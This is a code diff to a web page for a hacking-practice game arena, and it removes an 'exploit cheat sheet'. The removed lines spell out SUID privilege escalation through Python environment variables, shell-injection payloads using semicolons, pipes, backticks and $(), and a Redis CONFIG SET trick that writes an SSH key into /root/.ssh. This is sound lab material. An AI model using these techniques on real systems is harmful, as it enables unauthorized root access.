@@ -561,20 +561,10 @@ export default async function KothPage({
             <>
               <span className="text-muted">·</span>
               <span
-                className="text-red-400/90 uppercase tracking-widest inline-flex items-center gap-2 flex-wrap"
-                title="Mutating Arena · 4 drift layers reroll each round: SUID binary aliases (visible here), directories they live in, exploit signature (which env var / shell metachar works), and the decoy SUID name. `cat /etc/breachlab-drift` in-arena for the full scheme."
+                className="text-red-400/90 uppercase tracking-widest"
+                title="Mutating Arena — the rest is for you to find."
               >
-                <span>🌀 drift:</span>
-                <span className="font-mono normal-case tracking-normal">
-                  {drift.schemeLabel}
-                </span>
-                <span className="text-muted">/</span>
-                <span className="font-mono normal-case tracking-normal">
-                  {drift.scheme["system-checker"] ?? "system-checker"}
-                </span>
-                <span className="text-red-400/60 text-[10px]">
-                  + dir · sig · decoy
-                </span>
+                🌀 drift: {drift.schemeLabel}
               </span>
             </>
           )}
@@ -630,87 +620,8 @@ export default async function KothPage({
               <code className="ml-1">
                 crown-claim koth{mySlot.slot} &lt;exploit&gt;
               </code>{" "}
-              to claim the throne.
+              to claim the throne. Enumerate. Don&apos;t paste.
             </p>
-
-            {/* Exploit cheat sheet — collapsible, native <details>, no JS.
-                Drift-aware: paths + signatures rotate every round, so we
-                show the shape, not a paste-ready one-liner. Players
-                resolve <BINARY>/<SEP>/<VECTOR> by reading
-                /etc/breachlab-drift in-arena. */}
-            <details className="text-[12px] font-mono pt-1.5 border-t border-green/20 mt-2">
-              <summary className="cursor-pointer text-amber hover:text-amber/80 select-none py-1 tracking-wider">
-                ▸ exploit cheat sheet · open at your own risk
-              </summary>
-              <div className="space-y-3 pt-2 pb-1">
-                <div className="space-y-1">
-                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    step 0 — learn this round&apos;s drift
-                  </div>
-                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
-{`find / -perm -4000 -type f 2>/dev/null   # locate SUID binaries
-cat /etc/breachlab-drift                 # aliases · dirs · signatures`}
-                  </pre>
-                </div>
-
-                <div className="space-y-1">
-                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    suid-python-wrapper · pick by PHANTOM_PYTHON3_SIGNATURE
-                  </div>
-                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
-{`# sig=pythonstartup
-echo 'import os; os.system("crown-claim koth${mySlot.slot} suid-python-wrapper")' > /tmp/x.py
-PYTHONSTARTUP=/tmp/x.py <PY_ALIAS> -i </dev/null
-
-# sig=pythonpath
-mkdir /tmp/p
-echo 'import os; os.system("crown-claim koth${mySlot.slot} suid-python-wrapper")' > /tmp/p/sitecustomize.py
-PYTHONPATH=/tmp/p <PY_ALIAS>
-
-# sig=argv-c
-<PY_ALIAS> -c 'import os; os.system("crown-claim koth${mySlot.slot} suid-python-wrapper")'`}
-                  </pre>
-                </div>
-
-                <div className="space-y-1">
-                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    suid-shell-injection · pick by SYSTEM_CHECKER_SIGNATURE
-                  </div>
-                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
-{`# sig=semicolon   → '127.0.0.1; crown-claim koth${mySlot.slot} suid-shell-injection'
-# sig=pipe        → '127.0.0.1| crown-claim koth${mySlot.slot} suid-shell-injection'
-# sig=backtick    → '127.0.0.1 \`crown-claim koth${mySlot.slot} suid-shell-injection\`'
-# sig=dollar-paren→ '127.0.0.1 $(crown-claim koth${mySlot.slot} suid-shell-injection)'
-<SC_ALIAS> '<payload-for-active-sig>'`}
-                  </pre>
-                </div>
-
-                <div className="space-y-1">
-                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    redis-config-set-dir · unaffected by drift
-                  </div>
-                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
-{`ssh-keygen -t ed25519 -f /tmp/k -N ''
-KEY=$(cat /tmp/k.pub)
-redis-cli <<EOF
-CONFIG SET dir /root/.ssh
-CONFIG SET dbfilename authorized_keys
-SET x "\\n\\n$KEY\\n\\n"
-SAVE
-EOF
-ssh -i /tmp/k -o StrictHostKeyChecking=no root@localhost \\
-  "crown-claim koth${mySlot.slot} redis-config-set-dir"`}
-                  </pre>
-                </div>
-
-                <p className="text-[10px] text-muted leading-snug pt-1">
-                  Drift Mode: binary names, dirs, and exploit signatures
-                  reroll each round. Wrong vector = silent drop, no crown.
-                  One decoy SUID is planted per round — calling it logs
-                  your uid to the Guard&apos;s Eye.
-                </p>
-              </div>
-            </details>
           </div>
         ) : myKey ? (
           // Operator has a registered key but no slot in the current
